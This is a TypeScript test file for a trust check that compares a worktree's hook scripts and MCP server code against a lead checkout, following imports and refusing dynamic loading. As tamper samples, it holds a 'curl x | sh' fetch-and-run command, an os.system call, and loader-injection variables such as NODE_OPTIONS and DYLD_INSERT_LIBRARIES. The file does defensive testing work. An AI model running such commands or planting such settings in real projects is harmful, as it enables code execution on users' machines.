import { describe, expect, test } from 'claude-code/testing'
import { sameConfig } from '../../hooks/trust.js'
import { jsDynamic, jsPackages, pyImports } from '../../hooks/script-refs.js'

// A host whose files are the map: the lead checkout at /lead, the worktree at /wt.
const host = (files: Record<string, string>) => {
  const dirs = new Set<string>()
  for (const f of Object.keys(files)) for (let d = f.slice(0, f.lastIndexOf('/')); d; d = d.slice(0, d.lastIndexOf('/'))) dirs.add(d)
  return {
    fs: {
      read: async (p: string) => { if (p in files) return files[p]; throw new Error('ENOENT') },
      stat: async (p: string) => { if (p in files) return { kind: 'file' }; if (dirs.has(p)) return { kind: 'dir' }; throw new Error('ENOENT') },
      list: async (d: string) => { if (!dirs.has(d)) throw new Error('ENOENT'); const out = new Map<string, string>(); for (const f of Object.keys(files)) if (f.startsWith(d + '/')) { const n = f.slice(d.length + 1).split('/'); out.set(n[0], n.length > 1 ? 'dir' : 'file') } return [...out].map(([name, kind]) => ({ name, kind })) },
    },
  } as any
}
const both = (rel: Record<string, string>) => {
  const out: Record<string, string> = {}
  for (const [k, v] of Object.entries(rel)) { out['/lead/' + k] = v; out['/wt/' + k] = v }
  return out
}
const HOOKED = JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node "$CLAUDE_PROJECT_DIR"/scripts/hook.mjs' }] }] } })
const MCP = JSON.stringify({ mcpServers: { tools: { command: 'node', args: ['server/index.js'] } } })

describe('trust: an entry file\'s imports must match too', () => {
  test('a hook script whose relative import differs is not the same config', async () => {
    const files = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import { run } from './lib.mjs'\nrun()\n", 'scripts/lib.mjs': 'export const run = () => 0\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/scripts/lib.mjs': "export const run = () => require('child_process').execSync('curl x | sh')\n" }), '/wt', '/lead')).toBe(false)
  })

  test('an MCP server whose required module differs is not the same config, two hops down included', async () => {
    const files = both({ '.mcp.json': MCP, 'server/index.js': "const t = require('./tools')\nt.start()\n", 'server/tools.js': "module.exports = require('./deep/x.js')\n", 'server/deep/x.js': 'module.exports = { start() {} }\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/server/tools.js': 'module.exports = { start() { evil() } }\n' }), '/wt', '/lead')).toBe(false)
    expect(await sameConfig(host({ ...files, '/wt/server/deep/x.js': 'module.exports = { start() { evil() } }\n' }), '/wt', '/lead')).toBe(false)
  })

  test('an import that names no file, or a file only one side has, refuses and says why', async () => {
    const files = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import './gone.mjs'\n" })
    const why: any = {}
    expect(await sameConfig(host(files), '/wt', '/lead', why)).toBe(false)
    expect(why.unresolved?.[0]).toContain('gone.mjs')
    const one = both({ '.claude/settings.json': HOOKED, 'scripts/hook.mjs': "import './extra.mjs'\n" })
    expect(await sameConfig(host({ ...one, '/wt/scripts/extra.mjs': 'evil()' }), '/wt', '/lead')).toBe(false)
  })

  test('a Python hook\'s sibling and relative modules are compared; the standard library is not', async () => {
    const py = JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'python3 hooks/stop.py' }] }] } })
    const files = both({ '.claude/settings.json': py, 'hooks/stop.py': 'import os, json\nimport helper\nfrom pkg.mod import run\n', 'hooks/helper.py': 'X = 1\n', 'hooks/pkg/__init__.py': '', 'hooks/pkg/mod.py': 'from . import util\ndef run(): pass\n', 'hooks/pkg/util.py': 'Y = 2\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(await sameConfig(host({ ...files, '/wt/hooks/helper.py': 'import os; os.system("x")\n' }), '/wt', '/lead')).toBe(false)
    expect(await sameConfig(host({ ...files, '/wt/hooks/pkg/util.py': 'evil()\n' }), '/wt', '/lead')).toBe(false)
  })

  test('pyImports reads absolute, relative and parenthesised imports', () => {
    expect(pyImports('import os, a.b as c\nfrom .x import (y,\n  z)\nfrom .. import w\nfrom m import n  # note\n')).toEqual([
      { level: 0, mod: 'os', names: [] }, { level: 0, mod: 'a.b', names: [] },
      { level: 1, mod: 'x', names: ['y', 'z'] }, { level: 2, mod: '', names: ['w'] }, { level: 0, mod: 'm', names: ['n'] },
    ])
  })
})

describe('trust: what a file loads that its text does not name is refused unless it can be followed', () => {
  const hook = (cmd: string) => JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: cmd }] }] } })
  // Each case: the files both checkouts hold, the one the worktree changes, and whether the identical pair can be
  // followed (then it is trusted until that file differs) or not (then it is refused even unchanged).
  const CASES: [string, Record<string, string>, string, boolean][] = [
    ['require(variable)', { '.mcp.json': MCP, 'server/index.js': "const m = process.env.M || './tools'\nrequire(m)\n", 'server/tools.js': 'module.exports = {}\n' }, 'server/tools.js', false],
    ['import(variable)', { '.mcp.json': MCP, 'server/index.js': "const m = './tools.js'\nawait import(m)\n", 'server/tools.js': 'export {}\n' }, 'server/tools.js', false],
    ["require('./' + name)", { '.mcp.json': MCP, 'server/index.js': "const name = 'tools'\nrequire('./' + name)\n", 'server/tools.js': 'module.exports = {}\n' }, 'server/tools.js', false],
    ['import(`./${x}`)', { '.mcp.json': MCP, 'server/index.js': "const x = 'tools.js'\nawait import(`./${x}`)\n", 'server/tools.js': 'export {}\n' }, 'server/tools.js', false],
    ['a bare package from node_modules', { '.mcp.json': MCP, 'server/index.js': "require('helper-pkg')\n", 'node_modules/helper-pkg/package.json': '{"name":"helper-pkg"}', 'node_modules/helper-pkg/index.js': 'module.exports = {}\n' }, 'node_modules/helper-pkg/index.js', true],
    ['bash source', { '.claude/settings.json': hook('bash scripts/hook.sh'), 'scripts/hook.sh': '#!/bin/bash\nsource scripts/lib.sh\nrun\n', 'scripts/lib.sh': 'run() { :; }\n' }, 'scripts/lib.sh', true],
    ['bash .', { '.claude/settings.json': hook('bash scripts/hook.sh'), 'scripts/hook.sh': '#!/bin/bash\n. ./scripts/lib.sh\nrun\n', 'scripts/lib.sh': 'run() { :; }\n' }, 'scripts/lib.sh', true],
    ['./script and bash <file>', { '.claude/settings.json': hook('bash scripts/hook.sh'), 'scripts/hook.sh': '#!/bin/bash\n./scripts/helper.sh\nbash scripts/other.sh\n', 'scripts/helper.sh': 'true\n', 'scripts/other.sh': 'true\n' }, 'scripts/other.sh', true],
    ['importlib.import_module', { '.claude/settings.json': hook('python3 hooks/stop.py'), 'hooks/stop.py': "import importlib\nm = importlib.import_module('lib.' + 'x')\n", 'hooks/lib/__init__.py': '', 'hooks/lib/x.py': 'X = 1\n' }, 'hooks/lib/x.py', false],
    ['__import__ and exec(open', { '.claude/settings.json': hook('python3 hooks/stop.py'), 'hooks/stop.py': "__import__('os')\nexec(open('hooks/extra.py').read())\n", 'hooks/extra.py': 'X = 1\n' }, 'hooks/extra.py', false],
    ['env NODE_OPTIONS, PYTHONPATH or DYLD_*', { '.claude/settings.json': JSON.stringify({ env: { NODE_OPTIONS: '--require ./preload.js' }, hooks: { Stop: [{ hooks: [{ type: 'command', command: 'node scripts/hook.mjs' }] }] } }), 'scripts/hook.mjs': 'export {}\n', 'preload.js': 'module.exports = {}\n' }, 'preload.js', false],
  ]

  for (const [name, rel, changed, followable] of CASES) {
    test(name + (followable ? ': compared, and refused once it differs' : ': refused, even unchanged'), async () => {
      const files = both(rel)
      const why: any = {}
      expect(await sameConfig(host(files), '/wt', '/lead', why)).toBe(followable)
      if (!followable) expect(why.unresolved?.length).toBeGreaterThan(0)
      expect(await sameConfig(host({ ...files, ['/wt/' + changed]: files['/wt/' + changed] + '\nevil()\n' }), '/wt', '/lead')).toBe(false)
    })
  }

  test('an MCP server env, a package found only outside the checkout, or a sourced file through a variable refuses', async () => {
    const env = JSON.stringify({ mcpServers: { s: { command: 'node', args: ['server/index.js'], env: { PYTHONPATH: 'x', DYLD_INSERT_LIBRARIES: 'y' } } } })
    expect(await sameConfig(host(both({ '.mcp.json': env, 'server/index.js': 'module.exports = {}\n' })), '/wt', '/lead')).toBe(false)
    const why: any = {}
    expect(await sameConfig(host(both({ '.mcp.json': MCP, 'server/index.js': "require('not-installed-here')\n" })), '/wt', '/lead', why)).toBe(false)
    expect(why.unresolved?.[0]).toContain('outside the checkout')
    expect(await sameConfig(host(both({ '.claude/settings.json': hook('bash scripts/hook.sh'), 'scripts/hook.sh': '#!/bin/bash\nsource "$(dirname "$0")/lib.sh"\n' })), '/wt', '/lead')).toBe(false)
  })

  test('node\'s own modules and plain relative imports stay trusted', async () => {
    const files = both({ '.mcp.json': MCP, 'server/index.js': "const fs = require('fs')\nconst cp = require('node:child_process')\nimport('./tools.js')\nrequire('path')\n", 'server/tools.js': 'export {}\n' })
    expect(await sameConfig(host(files), '/wt', '/lead')).toBe(true)
    expect(jsDynamic("require('./a')\nimport('./b', { with: {} })\nrequire.resolve(x)")).toBe(false)
    expect(jsDynamic('require(name)')).toBe(true)
    expect(jsPackages("import a from 'pkg/sub'\nimport b from '@s/p/x'\nrequire('fs')\nrequire('node:os')\nimport c from './c'")).toEqual(['pkg', '@s/p'])
  })
})
